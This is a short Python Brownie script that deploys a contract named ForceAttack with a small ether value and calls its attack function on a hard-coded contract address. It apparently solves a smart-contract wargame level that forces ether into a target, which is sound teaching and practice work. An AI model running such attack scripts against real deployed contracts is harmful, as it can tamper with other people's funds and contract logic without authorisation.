from scripts.helpful_scripts import get_account
from brownie import ForceAttack


def main():
    account = get_account()
    attack = ForceAttack.deploy({"from": account, "value": 0.00001e18})

    tx = attack.attack("0x665f1178ee6Ab1FaA26E7650a92C672602E56Caf", {"from": account})
    tx.wait(1)
